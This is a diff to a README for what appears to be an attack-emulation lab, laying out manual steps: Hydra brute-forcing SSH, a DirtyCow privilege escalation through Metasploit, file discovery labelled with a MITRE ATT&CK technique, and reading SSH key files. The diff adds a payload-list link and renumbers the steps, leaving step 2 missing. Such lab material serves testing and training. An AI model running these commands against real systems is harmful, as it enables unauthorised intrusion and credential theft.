@@ -159,11 +159,12 @@ Ensure the following packages are installed:
 ### 3.1 Perform Attacks Manually 
 1. **Brute Force SSH Attack**:
    Execute Hydra:
+   > user.txt and pass.txt can be found [here](./payloads/)
    ```bash
    hydra -L /path/to/user.txt -P /path/to/pass.txt ssh://<Victim_IP> -t 4 -o results.txt
    sshpass -p <The_Password> ssh <The_User>@<Victim_IP>
    ```
-2. **Privilege Escalation**:
+3. **Privilege Escalation**:
    Use the DirtyCow exploit:
    ```bash
    msfconsole
@@ -174,11 +175,11 @@ Ensure the following packages are installed:
    run
    whoami
    ```
-3. **File and Directory Discovery**:
+4. **File and Directory Discovery**:
    ```bash
    cd $HOME && find . -print > /tmp/T1083.txt
    ```
-4. **Extract SSH Keys**:
+5. **Extract SSH Keys**:
    ```bash
    cat ~/.ssh/authorized_keys
    ```
